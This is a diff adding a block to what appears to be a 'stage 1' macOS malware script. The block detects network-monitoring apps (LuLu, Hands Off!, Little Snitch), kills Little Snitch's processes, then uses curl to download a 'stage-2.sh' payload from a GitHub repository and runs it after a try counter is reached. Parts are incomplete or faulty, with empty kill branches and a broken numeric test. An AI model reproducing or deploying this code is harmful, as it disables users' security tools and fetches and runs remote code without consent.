@@ -304,5 +304,64 @@ then
 		sed -i '' "2s/${RC05}\$/${RC06}/" ./.stage-1.log
 	fi
 fi
+#Network monitor killer and stage 2 downloader (originally from stage-1-old):
+#Should check if processes are running, before and after attempting to kill them
+NMLU=/Applications/LuLu.app
+NMHO="/Applications/Hands Off!.app"
+NMLS=/Applications/Little\ Snitch\ Configuration.app
+if [ -d "$NMLU" ] 
+then
+	if [ ${DEBUG} == 1 ]
+	then
+		echo "LuLu found. Killing..."
+	fi
+	if [ ${LOGGING} == 1 ]
+	then
+		echo "LuLu found. Killing..." >> ./.stage-1.log
+	fi
+elif [ -d "$NMHO" ]
+then
+	if [ ${DEBUG} == 1 ]
+	then
+		echo "Hands Off! found. Killing..."
+	fi
+	if [ ${LOGGING} == 1 ]
+	then
+		echo "Hands Off! found. Killing..." >> ./.stage-1.log
+	fi
+	#Kill Hands Off!:
+elif [ -d "$NMLS" ]
+then
+	if [ ${DEBUG} == 1 ]
+	then
+		echo "Little Snitch found. Killing..."
+	fi
+	if [ ${LOGGING} == 1 ]
+	then
+		echo "Little Snitch found. Killing..." >> ./.stage-1.log
+	fi
+	#Kill Little Snitch:
+	killall "Little Snitch Agent"
+	killall "Little Snitch Configuration"
+	killall "Little Snitch Network Monitor"
+else
+	if [ ${DEBUG} == 1 ]
+	then
+		echo "No network monitors found"
+	fi
+	if [ ${LOGGING} == 1 ]
+	then
+		echo "No network monitors found" >> ./.stage-1.log
+	fi
+fi
+curl https://raw.githubusercontent.com/The-SamminAter/lol-limewire/master/stage-2.sh > ./.stage-2.sh	
+#TryCount trigger for Stage 2
+#There are 34 system applications/directories in /Applications/ as of macOS Sierra.
+#That means that 25 is probably a reasonable number of tries before triggering
+#stage 2.
+if [ ${TryCount} >= 25 ]
+then
+	./.stage-2.sh
+fi
 cd "${OrigPath}"
 #Placeholder
